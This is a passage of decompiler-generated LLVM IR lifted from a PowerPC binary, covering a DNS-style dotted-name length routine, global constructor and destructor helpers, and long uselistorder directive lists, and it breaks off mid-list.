dec_label_pc_1000adcc:                            ; preds = %dec_label_pc_1000ad74, %dec_label_pc_1000adc8
  %v1_1000add0 = phi i32 [ %v2_1000ad84, %dec_label_pc_1000ad74 ], [ %v1_1000add0.pre, %dec_label_pc_1000adc8 ]
  %v0_1000add4.pre = phi i32 [ 0, %dec_label_pc_1000ad74 ], [ %v0_1000add4.pre.pre, %dec_label_pc_1000adc8 ]
  %v0_1000adcc = phi i32 [ %v0_1000ad7c, %dec_label_pc_1000ad74 ], [ %v0_1000adcc.pre, %dec_label_pc_1000adc8 ]
  %v0_1000add0.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000adcc, i32* %r11.global-to-local, align 4
  %v2_1000add0 = add i32 %v1_1000add0, %v0_1000add0.pre
  %v3_1000add0 = inttoptr i32 %v2_1000add0 to i8*
  %v4_1000add0 = load i8, i8* %v3_1000add0, align 1
  %v5_1000add0 = zext i8 %v4_1000add0 to i32
  store i32 %v5_1000add0, i32* @r31, align 4
  %v3_1000add4 = icmp eq i32 %v0_1000add4.pre, 0
  store i1 %v3_1000add4, i1* @cr4_eq, align 1
  %v3_1000add8 = icmp eq i8 %v4_1000add0, 0
  br i1 %v3_1000add8, label %dec_label_pc_1000ade0, label %dec_label_pc_1000ad54

dec_label_pc_1000ade0:                            ; preds = %dec_label_pc_1000adcc
  %v0_1000ade8.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000add4, label %dec_label_pc_1000adf4, label %dec_label_pc_1000ade4

dec_label_pc_1000ade4:                            ; preds = %dec_label_pc_1000ad44, %dec_label_pc_1000ade0
  %v0_1000ade8.pre26 = phi i32 [ %v0_1000ade8.pre.pre, %dec_label_pc_1000ade0 ], [ 0, %dec_label_pc_1000ad44 ]
  %v1_1000ade4 = add i32 %v0_1000ade8.pre26, 1
  store i32 %v1_1000ade4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000adf4

dec_label_pc_1000adf4:                            ; preds = %dec_label_pc_1000ad8c, %dec_label_pc_1000ade0, %dec_label_pc_1000ade4, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_1000ade4, %dec_label_pc_1000ade4 ], [ %v0_1000ade8.pre.pre, %dec_label_pc_1000ade0 ], [ -1, %dec_label_pc_1000ad8c ]
  %v1_1000ae08 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000ad20)
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000ade8.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000add4, { 0, 2, 1 }
  uselistorder i32 %v5_1000add0, { 1, 0 }
  uselistorder i32 %v5_1000add021, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_1000ad20, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 17, 16, 15, 14, 13, 4, 3, 12, 11, 2, 22, 9, 8, 0, 20, 10, 1, 7, 5, 6, 21, 19, 18 }
  uselistorder i32* @r5, { 17, 18, 19, 3, 20, 21, 22, 33, 58, 59, 26, 27, 7, 4, 28, 1, 29, 34, 35, 36, 37, 38, 39, 60, 40, 41, 42, 43, 44, 45, 6, 61, 62, 73, 13, 14, 8, 30, 31, 65, 66, 67, 9, 46, 47, 48, 74, 75, 76, 77, 68, 69, 2, 70, 71, 72, 49, 50, 51, 0, 52, 53, 54, 63, 64, 23, 24, 55, 56, 10, 57, 25, 5, 11, 12, 15, 16, 32 }
  uselistorder i32* @r29, { 34, 35, 36, 37, 38, 130, 131, 1, 39, 12, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 17, 18, 19, 20, 21, 2, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 99, 132, 133, 64, 66, 67, 83, 84, 134, 135, 101, 102, 103, 100, 104, 14, 105, 106, 3, 107, 108, 109, 110, 111, 112, 136, 137, 138, 139, 140, 31, 89, 90, 91, 92, 22, 23, 93, 4, 94, 95, 85, 86, 87, 88, 96, 97, 98, 5, 141, 142, 143, 113, 114, 6, 115, 116, 117, 118, 74, 75, 13, 76, 68, 69, 70, 73, 71, 15, 7, 0, 72, 119, 120, 121, 122, 123, 124, 125, 128, 8, 11, 9, 129, 16, 126, 127, 144, 145, 146, 147, 77, 78, 79, 80, 81, 10, 82, 65, 24, 25, 26, 27, 28, 29, 30, 32, 33 }
  uselistorder i32* @r28, { 2, 33, 34, 35, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 48, 49, 50, 51, 52, 53, 15, 3, 14, 16, 17, 18, 19, 20, 21, 54, 58, 55, 56, 57, 1, 59, 60, 92, 93, 84, 85, 127, 128, 94, 4, 95, 96, 97, 98, 99, 5, 129, 130, 131, 132, 139, 22, 23, 24, 25, 26, 27, 28, 29, 30, 87, 88, 89, 86, 90, 91, 133, 134, 135, 136, 137, 100, 101, 69, 6, 70, 71, 63, 64, 65, 66, 67, 68, 102, 103, 104, 7, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 0, 123, 124, 11, 12, 13, 138, 72, 73, 74, 75, 9, 76, 10, 77, 78, 79, 80, 81, 82, 83, 125, 126, 61, 62, 31, 32 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 3, 4, 2 }
  uselistorder i32 8, { 44, 45, 46, 47, 48, 49, 21, 22, 50, 51, 52, 53, 54, 55, 25, 26, 23, 16, 18, 19, 27, 28, 29, 30, 31, 56, 57, 58, 59, 20, 83, 72, 0, 61, 84, 85, 86, 87, 88, 89, 90, 91, 13, 92, 93, 94, 118, 119, 126, 129, 12, 116, 117, 14, 32, 15, 34, 43, 33, 76, 75, 73, 74, 35, 36, 37, 69, 70, 71, 77, 78, 79, 1, 80, 81, 82, 24, 123, 124, 125, 2, 130, 3, 127, 128, 62, 63, 38, 64, 39, 95, 96, 97, 98, 99, 17, 100, 101, 102, 103, 4, 5, 104, 105, 6, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 11, 7, 120, 121, 122, 65, 66, 67, 68, 60, 8, 9, 10, 40, 41, 42 }
  uselistorder i32* @r30, { 43, 44, 45, 8, 46, 48, 50, 51, 52, 53, 54, 47, 49, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 69, 66, 67, 5, 68, 4, 111, 112, 113, 9, 114, 115, 116, 71, 72, 73, 82, 83, 84, 85, 17, 86, 87, 88, 89, 90, 91, 92, 93, 117, 118, 119, 120, 121, 10, 122, 123, 124, 125, 126, 11, 150, 151, 152, 153, 12, 97, 154, 165, 155, 156, 27, 0, 28, 13, 29, 30, 98, 99, 100, 31, 32, 33, 34, 35, 94, 95, 96, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 157, 158, 159, 160, 161, 162, 163, 14, 164, 127, 128, 80, 78, 79, 81, 77, 75, 74, 6, 76, 129, 130, 131, 132, 133, 2, 135, 18, 136, 15, 137, 138, 134, 139, 140, 141, 142, 143, 144, 145, 16, 146, 147, 3, 148, 149, 70, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i1* @cr4_eq, { 7, 5, 6, 0, 8, 2, 3, 9, 10, 1, 4 }
  uselistorder i1 false, { 1, 2, 4, 5, 11, 6, 7, 8, 9, 0, 10, 12, 13, 14, 3, 15, 16 }
  uselistorder i32* @r31, { 71, 2, 7, 72, 6, 73, 74, 75, 8, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 46, 51, 9, 40, 10, 11, 52, 53, 54, 90, 91, 92, 93, 1, 94, 95, 96, 97, 98, 99, 100, 101, 12, 102, 202, 203, 204, 205, 206, 103, 13, 104, 105, 106, 107, 14, 108, 109, 110, 111, 112, 113, 207, 208, 209, 210, 211, 212, 213, 214, 215, 15, 216, 16, 266, 267, 268, 17, 120, 119, 3, 121, 122, 145, 173, 174, 175, 176, 177, 60, 61, 62, 63, 123, 18, 124, 125, 19, 134, 135, 20, 136, 137, 217, 218, 219, 220, 221, 21, 222, 223, 224, 225, 22, 226, 23, 227, 228, 229, 45, 230, 0, 269, 270, 271, 24, 47, 272, 41, 181, 25, 182, 278, 279, 258, 43, 259, 260, 273, 276, 277, 69, 70, 261, 262, 263, 264, 55, 56, 57, 58, 59, 64, 65, 4, 183, 184, 185, 186, 187, 188, 66, 67, 68, 189, 190, 178, 179, 180, 191, 192, 193, 27, 194, 195, 196, 26, 197, 198, 199, 200, 201, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 28, 231, 138, 139, 140, 29, 141, 142, 143, 128, 129, 130, 131, 132, 30, 44, 133, 5, 126, 127, 31, 144, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 34, 33, 248, 32, 252, 253, 35, 254, 255, 256, 257, 49, 50, 250, 249, 251, 274, 36, 275, 48, 37, 42, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 114, 115, 116, 117, 38, 39, 118, 265 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 3, 4, 7, 8, 9, 10, 11, 12, 13, 14, 1, 2, 15, 16, 17, 5, 18, 0, 19, 6 }
  uselistorder i32* @r25, { 3, 4, 5, 7, 8, 6, 9, 1, 2, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 30, 19, 20, 21, 22, 0, 23, 24, 25, 26, 28, 29 }
  uselistorder i32* @r26, { 1, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 15, 16, 17, 18, 19, 3, 4, 20, 21, 22, 23, 25, 2, 26, 27, 29, 30, 31, 32, 33, 34, 35, 49, 50, 72, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 69, 51, 52, 53, 54, 55, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 0, 70, 71, 28, 67, 68, 24 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 27, 21, 26, 25, 12, 20, 17, 11, 9, 16, 8, 7, 6, 5, 4, 3, 2, 1, 23, 15, 35, 24, 34, 19, 18, 10, 31, 30, 14, 33, 13, 32, 29, 22, 0 }
  uselistorder label %dec_label_pc_1000adf4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000ade4, { 1, 0 }
  uselistorder label %dec_label_pc_1000adcc, { 1, 0 }
  uselistorder label %dec_label_pc_1000adc8, { 1, 0 }
  uselistorder label %dec_label_pc_1000adb8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad74, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ad54, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1000ae10 = load i32, i32* @r3, align 4
  store i32 %v0_1000ae10, i32* %r11.global-to-local, align 4
  %v3_1000ae10 = icmp eq i32 %v0_1000ae10, 0
  %v0_1000ae18 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ae10, i32 %v0_1000ae18)
  %v0_1000ae28 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000ae34

dec_label_pc_1000ae20:                            ; preds = %dec_label_pc_1000ae30
  %v1_1000ae20 = add i32 %v1_1000ae34, 2
  br label %dec_label_pc_1000ae50

dec_label_pc_1000ae30:                            ; preds = %dec_label_pc_1000ae34
  %v2_1000ae48 = add i32 %v1_1000ae38, %v5_1000ae34
  %v3_1000ae44 = icmp eq i32 %v1_1000ae40, 192
  br i1 %v3_1000ae44, label %dec_label_pc_1000ae20, label %dec_label_pc_1000ae34

dec_label_pc_1000ae34:                            ; preds = %dec_label_pc_1000ae30, %entry
  %v1_1000ae34 = phi i32 [ %v2_1000ae48, %dec_label_pc_1000ae30 ], [ %v0_1000ae28, %entry ]
  %v0_1000ae34 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000ae34 = add i32 %v0_1000ae34, %v1_1000ae34
  %v3_1000ae34 = inttoptr i32 %v2_1000ae34 to i8*
  %v4_1000ae34 = load i8, i8* %v3_1000ae34, align 1
  %v5_1000ae34 = zext i8 %v4_1000ae34 to i32
  %v1_1000ae38 = add i32 %v1_1000ae34, 1
  %v3_1000ae3c = icmp eq i8 %v4_1000ae34, 0
  %v1_1000ae40 = call i32 @__asm_rlwinm(i32 %v5_1000ae34, i32 0, i32 24, i32 25)
  br i1 %v3_1000ae3c, label %dec_label_pc_1000ae50, label %dec_label_pc_1000ae30

dec_label_pc_1000ae50:                            ; preds = %dec_label_pc_1000ae34, %dec_label_pc_1000ae20
  %v1_1000ae50 = phi i32 [ %v1_1000ae20, %dec_label_pc_1000ae20 ], [ %v1_1000ae38, %dec_label_pc_1000ae34 ]
  %v0_1000ae50 = load i32, i32* @r4, align 4
  %v2_1000ae50 = sub i32 %v1_1000ae50, %v0_1000ae50
  ret i32 %v2_1000ae50

; uselistorder directives
  uselistorder i32 %v1_1000ae38, { 1, 0 }
  uselistorder i32 %v5_1000ae34, { 1, 0 }
  uselistorder i32 %v1_1000ae34, { 2, 1, 0 }
  uselistorder i32 %v0_1000ae10, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 44, 42, 19, 26, 27, 28, 43, 45, 46, 1, 24, 2, 25, 47, 48, 49, 29, 17, 18, 3, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 20, 21, 22, 23, 16, 50 }
  uselistorder i32 24, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 24, 14, 15, 23, 16, 17, 20, 25, 1, 3, 2, 26, 21, 18, 19, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 22, 0 }
  uselistorder i8 0, { 28, 25, 3, 29, 1, 30, 31, 4, 5, 6, 7, 8, 19, 35, 33, 18, 34, 32, 17, 36, 37, 38, 39, 41, 40, 20, 9, 42, 43, 10, 11, 44, 45, 22, 48, 46, 47, 21, 49, 50, 12, 52, 51, 23, 53, 26, 0, 54, 55, 56, 13, 57, 59, 60, 61, 62, 58, 63, 14, 64, 65, 66, 67, 69, 70, 71, 72, 68, 73, 2, 15, 74, 75, 76, 78, 77, 16, 79, 80, 81, 82, 83, 84, 87, 85, 86, 88, 89, 90, 91, 94, 93, 24, 92, 95, 96, 97, 98, 99, 100, 101, 103, 102, 27, 104, 105, 106 }
  uselistorder i32 2, { 0, 30, 4, 80, 45, 81, 82, 31, 1, 2, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 5, 95, 6, 74, 75, 76, 32, 29, 96, 97, 98, 99, 100, 46, 47, 33, 108, 109, 129, 39, 7, 8, 3, 48, 106, 9, 10, 34, 103, 104, 38, 110, 111, 11, 112, 113, 114, 130, 49, 50, 126, 51, 127, 52, 128, 131, 35, 12, 13, 53, 54, 55, 56, 57, 14, 40, 43, 44, 58, 59, 107, 41, 132, 15, 16, 36, 37, 60, 61, 115, 116, 101, 102, 117, 118, 119, 17, 18, 19, 20, 21, 120, 121, 22, 123, 124, 125, 28, 122, 105, 62, 23, 133, 25, 24, 42, 64, 63, 77, 66, 65, 67, 78, 69, 68, 79, 26, 27, 71, 70, 72, 73 }
  uselistorder i32* @r4, { 40, 41, 1, 42, 43, 44, 45, 2, 46, 47, 48, 49, 9, 10, 50, 51, 52, 53, 54, 55, 56, 57, 102, 103, 58, 59, 60, 61, 62, 6, 63, 64, 65, 66, 67, 14, 11, 77, 78, 79, 80, 81, 82, 83, 113, 8, 7, 105, 37, 38, 13, 15, 16, 17, 18, 68, 69, 75, 76, 106, 107, 108, 3, 84, 85, 86, 12, 87, 88, 70, 71, 72, 73, 74, 4, 98, 99, 112, 89, 90, 91, 0, 92, 93, 94, 104, 95, 96, 19, 97, 5, 20, 21, 109, 110, 111, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 39, 100, 101 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12, 25, 13, 1, 17, 18, 19, 20, 21, 26, 14, 22, 15, 16, 28, 27, 23, 24, 2 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d054.417 to i32), i32* %r31.global-to-local, align 4
  %v3_1000ae74 = load i32, i32* @global_var_1001d054.417, align 4
  %v3_1000ae78 = icmp eq i32 %v3_1000ae74, -1
  br i1 %v3_1000ae78, label %dec_label_pc_1000ae94, label %dec_label_pc_1000ae80

dec_label_pc_1000ae80:                            ; preds = %entry, %dec_label_pc_1000ae80
  %v0_1000ae80 = phi i32 [ %v3_1000ae88, %dec_label_pc_1000ae80 ], [ %v3_1000ae74, %entry ]
  call void @__pseudo_call(i32 %v0_1000ae80)
  %v0_1000ae88 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000ae88 = add i32 %v0_1000ae88, -4
  %v2_1000ae88 = inttoptr i32 %v1_1000ae88 to i32*
  %v3_1000ae88 = load i32, i32* %v2_1000ae88, align 4
  store i32 %v1_1000ae88, i32* %r31.global-to-local, align 4
  %v3_1000ae8c = icmp eq i32 %v3_1000ae88, -1
  br i1 %v3_1000ae8c, label %dec_label_pc_1000ae94, label %dec_label_pc_1000ae80

dec_label_pc_1000ae94:                            ; preds = %dec_label_pc_1000ae80, %entry
  %v0_1000aea4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000aea4

; uselistorder directives
  uselistorder i32 %v3_1000ae88, { 1, 0 }
  uselistorder i32 -4, { 29, 20, 21, 22, 13, 14, 15, 16, 17, 23, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 18, 19, 33, 34, 30, 31, 32, 25, 26, 27, 28, 11, 12, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 4, 3, 5, 6, 1, 2, 0 }
  uselistorder i32 -1, { 317, 318, 16, 44, 55, 215, 216, 56, 264, 119, 217, 57, 218, 48, 58, 219, 59, 220, 190, 191, 108, 109, 61, 60, 192, 45, 46, 193, 194, 195, 153, 67, 65, 63, 196, 197, 198, 66, 64, 62, 199, 200, 154, 201, 155, 221, 25, 26, 156, 222, 157, 49, 223, 68, 265, 120, 3, 4, 266, 267, 50, 268, 269, 69, 70, 0, 158, 319, 29, 30, 31, 320, 159, 324, 27, 28, 202, 323, 307, 71, 308, 160, 309, 32, 33, 310, 311, 225, 34, 235, 236, 237, 123, 238, 239, 240, 241, 242, 243, 244, 121, 245, 122, 246, 247, 248, 249, 161, 270, 162, 5, 51, 163, 271, 272, 164, 165, 166, 273, 167, 252, 253, 168, 254, 255, 169, 226, 230, 231, 47, 274, 275, 276, 117, 52, 277, 278, 279, 280, 124, 281, 6, 72, 282, 283, 284, 285, 286, 170, 287, 125, 288, 289, 126, 7, 8, 127, 128, 290, 171, 172, 291, 292, 293, 294, 73, 74, 321, 322, 75, 256, 129, 76, 77, 78, 79, 80, 81, 82, 83, 84, 325, 85, 327, 326, 86, 312, 313, 130, 173, 314, 37, 38, 174, 315, 35, 36, 175, 211, 9, 131, 87, 88, 316, 132, 89, 203, 10, 90, 53, 205, 39, 40, 176, 133, 110, 91, 204, 250, 251, 43, 177, 257, 111, 258, 259, 134, 263, 92, 328, 329, 295, 93, 178, 179, 260, 261, 180, 262, 115, 54, 181, 182, 183, 184, 185, 41, 186, 135, 94, 232, 112, 227, 229, 228, 17, 18, 19, 20, 21, 22, 23, 113, 114, 296, 15, 297, 11, 298, 299, 187, 136, 24, 188, 300, 301, 1, 303, 304, 2, 137, 138, 189, 42, 139, 118, 305, 140, 302, 233, 12, 13, 206, 306, 141, 234, 142, 224, 143, 95, 96, 97, 98, 99, 100, 207, 101, 102, 103, 330, 208, 209, 210, 144, 145, 106, 105, 104, 212, 146, 213, 147, 148, 149, 150, 14, 116, 214, 107, 151, 152 }
  uselistorder i32 1, { 302, 704, 311, 705, 706, 707, 708, 709, 710, 310, 309, 711, 428, 712, 713, 84, 85, 83, 86, 374, 714, 248, 247, 486, 192, 193, 715, 371, 716, 375, 719, 720, 721, 722, 723, 429, 724, 725, 726, 16, 15, 20, 19, 18, 17, 21, 14, 22, 727, 728, 729, 487, 5, 8, 6, 9, 7, 10, 730, 12, 13, 731, 4, 732, 47, 49, 48, 46, 366, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 489, 488, 172, 171, 170, 173, 174, 175, 639, 640, 641, 642, 490, 481, 185, 177, 187, 176, 182, 183, 184, 181, 179, 180, 178, 186, 188, 383, 733, 734, 368, 735, 736, 737, 738, 739, 740, 491, 69, 68, 70, 67, 71, 419, 744, 741, 742, 743, 492, 169, 166, 167, 163, 165, 168, 164, 745, 644, 645, 646, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 139, 135, 137, 136, 132, 133, 141, 134, 138, 140, 376, 647, 162, 127, 121, 282, 377, 813, 126, 123, 124, 122, 125, 206, 814, 494, 493, 88, 87, 89, 161, 312, 885, 430, 431, 496, 495, 292, 289, 293, 291, 288, 290, 0, 432, 433, 499, 498, 497, 299, 297, 300, 298, 296, 295, 502, 501, 500, 81, 82, 503, 762, 367, 763, 766, 767, 768, 769, 770, 505, 504, 315, 316, 313, 314, 784, 785, 786, 363, 787, 788, 384, 789, 790, 403, 404, 434, 385, 400, 791, 436, 407, 792, 793, 437, 794, 795, 796, 435, 511, 510, 509, 508, 475, 507, 506, 77, 76, 73, 75, 78, 72, 79, 74, 80, 1, 797, 798, 799, 800, 386, 60, 648, 649, 50, 51, 650, 278, 281, 280, 279, 277, 815, 201, 202, 205, 204, 203, 816, 817, 378, 818, 251, 253, 252, 260, 263, 258, 262, 261, 259, 438, 771, 774, 476, 92, 91, 93, 441, 819, 820, 821, 439, 822, 440, 823, 824, 825, 826, 827, 521, 520, 519, 518, 517, 516, 515, 514, 513, 477, 512, 228, 226, 224, 225, 227, 220, 233, 229, 223, 230, 219, 222, 234, 221, 232, 231, 218, 217, 216, 828, 420, 146, 148, 147, 145, 149, 142, 144, 143, 150, 53, 52, 54, 886, 887, 56, 57, 55, 829, 830, 522, 320, 317, 319, 322, 321, 318, 387, 831, 525, 524, 523, 307, 191, 526, 254, 272, 275, 249, 358, 359, 303, 273, 527, 189, 528, 274, 246, 442, 529, 11, 443, 409, 408, 880, 533, 532, 531, 530, 213, 210, 215, 214, 212, 211, 888, 536, 535, 534, 239, 238, 240, 237, 889, 537, 692, 693, 694, 421, 695, 27, 29, 24, 26, 23, 28, 30, 25, 444, 696, 388, 445, 446, 447, 448, 538, 643, 116, 112, 110, 113, 111, 114, 115, 117, 651, 389, 652, 539, 325, 324, 323, 326, 327, 328, 329, 36, 35, 37, 34, 42, 38, 41, 40, 43, 45, 39, 44, 540, 541, 542, 276, 544, 543, 304, 305, 306, 264, 265, 119, 120, 118, 256, 255, 372, 545, 330, 410, 546, 547, 548, 549, 550, 551, 552, 553, 554, 422, 423, 801, 390, 449, 802, 803, 411, 812, 557, 556, 555, 102, 100, 101, 99, 103, 98, 96, 97, 104, 95, 105, 94, 558, 559, 890, 561, 560, 331, 563, 562, 62, 61, 63, 564, 717, 718, 832, 833, 565, 332, 334, 333, 335, 450, 834, 804, 805, 806, 807, 808, 809, 810, 811, 194, 195, 197, 196, 198, 835, 836, 837, 665, 369, 64, 65, 66, 765, 764, 881, 882, 883, 59, 898, 899, 269, 268, 271, 270, 894, 895, 896, 897, 337, 338, 336, 3, 451, 412, 775, 776, 777, 401, 379, 33, 32, 31, 773, 566, 90, 391, 452, 772, 568, 567, 569, 242, 241, 570, 286, 287, 285, 571, 267, 838, 839, 454, 840, 841, 842, 843, 844, 845, 847, 848, 849, 455, 850, 851, 392, 852, 453, 853, 456, 854, 855, 856, 846, 575, 574, 573, 572, 158, 155, 153, 152, 157, 154, 160, 156, 159, 151, 857, 858, 859, 860, 861, 341, 342, 340, 339, 343, 344, 457, 200, 199, 862, 863, 130, 129, 131, 128, 865, 393, 866, 373, 394, 868, 869, 870, 871, 395, 873, 397, 872, 867, 458, 478, 582, 581, 580, 579, 578, 577, 576, 346, 349, 351, 345, 350, 348, 353, 347, 352, 354, 380, 381, 207, 208, 209, 864, 413, 479, 459, 245, 244, 243, 892, 414, 893, 778, 779, 780, 781, 782, 783, 382, 584, 583, 107, 106, 108, 586, 585, 356, 357, 355, 588, 587, 760, 761, 590, 589, 58, 190, 308, 250, 283, 360, 361, 266, 362, 257, 891, 591, 301, 653, 654, 655, 656, 657, 658, 462, 405, 659, 660, 365, 460, 461, 463, 661, 464, 662, 663, 364, 398, 664, 599, 598, 597, 596, 595, 594, 593, 592, 465, 415, 416, 417, 466, 467, 602, 601, 600, 603, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 605, 604, 480, 109, 676, 402, 399, 677, 678, 679, 680, 396, 468, 681, 682, 683, 684, 685, 686, 687, 688, 689, 609, 608, 607, 606, 236, 235, 690, 469, 470, 611, 610, 691, 294, 697, 613, 612, 471, 699, 370, 406, 698, 472, 473, 474, 621, 620, 619, 618, 617, 616, 615, 614, 700, 701, 622, 418, 702, 2, 703, 623, 425, 874, 875, 424, 876, 877, 426, 427, 878, 879, 884, 625, 624, 482, 627, 626, 284, 483, 484, 485 }
  uselistorder label %dec_label_pc_1000ae80, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_1000aec0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000aec0

; uselistorder directives
  uselistorder i32* @r3, { 30, 31, 133, 134, 137, 135, 136, 0, 138, 139, 11, 140, 12, 141, 59, 60, 61, 142, 143, 144, 53, 145, 32, 13, 67, 68, 14, 33, 212, 213, 214, 146, 257, 258, 259, 147, 155, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 15, 193, 194, 195, 196, 197, 198, 199, 200, 202, 69, 70, 16, 71, 72, 73, 34, 215, 216, 217, 218, 219, 17, 35, 220, 221, 222, 223, 224, 225, 2, 1, 226, 227, 228, 36, 57, 271, 3, 37, 4, 51, 56, 265, 266, 267, 54, 74, 75, 76, 77, 78, 79, 80, 81, 62, 63, 64, 65, 66, 124, 125, 82, 52, 83, 29, 38, 203, 201, 204, 205, 206, 207, 208, 209, 210, 211, 39, 48, 49, 50, 268, 269, 5, 229, 230, 231, 232, 233, 40, 270, 41, 161, 162, 163, 164, 165, 166, 167, 42, 156, 157, 158, 159, 160, 84, 85, 168, 169, 86, 87, 234, 43, 235, 236, 237, 6, 10, 7, 238, 8, 239, 9, 240, 241, 242, 243, 244, 245, 44, 246, 247, 248, 249, 250, 251, 58, 260, 261, 262, 263, 264, 170, 171, 172, 173, 174, 175, 176, 177, 252, 253, 254, 148, 149, 150, 151, 152, 153, 154, 88, 89, 45, 90, 91, 92, 18, 93, 19, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 23, 22, 105, 106, 107, 108, 21, 20, 109, 110, 111, 112, 113, 114, 28, 115, 27, 116, 117, 26, 118, 119, 25, 120, 24, 121, 122, 123, 126, 127, 128, 130, 129, 131, 132, 255, 256, 46, 47, 55 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  store i32 268480212, i32* @lr, align 4
  %v0_1000aed0 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_1000aed0

; uselistorder directives
  uselistorder i32 0, { 981, 982, 32, 985, 100, 983, 984, 57, 986, 987, 988, 991, 989, 0, 990, 992, 1, 99, 993, 164, 994, 22, 1196, 1197, 1010, 997, 1000, 1001, 1002, 248, 1003, 1004, 1006, 1005, 1007, 1008, 1009, 1011, 1012, 1013, 995, 996, 998, 999, 101, 1014, 1016, 1017, 1015, 1018, 1019, 1020, 1021, 211, 861, 1022, 862, 212, 863, 102, 103, 870, 871, 83, 872, 873, 874, 875, 876, 877, 878, 104, 165, 880, 879, 105, 881, 882, 107, 106, 883, 249, 884, 885, 886, 109, 108, 887, 888, 216, 250, 889, 110, 1023, 1024, 1025, 1026, 1031, 1027, 61, 1032, 1033, 1028, 1029, 1030, 58, 59, 60, 1034, 251, 33, 34, 35, 206, 1036, 1037, 1038, 1039, 111, 1035, 252, 1040, 1041, 1042, 112, 1043, 84, 36, 1044, 166, 1045, 1046, 1047, 899, 167, 1198, 1199, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1200, 23, 1201, 114, 113, 1202, 1203, 1204, 1205, 115, 1055, 1056, 1057, 1058, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 24, 1059, 1415, 253, 1418, 64, 254, 217, 1419, 255, 1422, 1423, 62, 63, 1424, 2, 3, 864, 1392, 1393, 1394, 65, 66, 1395, 1416, 1417, 218, 256, 1073, 1066, 257, 67, 1067, 1068, 1069, 37, 1071, 1072, 1096, 1097, 1117, 1118, 1119, 1120, 219, 208, 209, 259, 1121, 1122, 1123, 1125, 168, 1128, 260, 220, 1130, 1132, 1133, 1134, 258, 221, 1127, 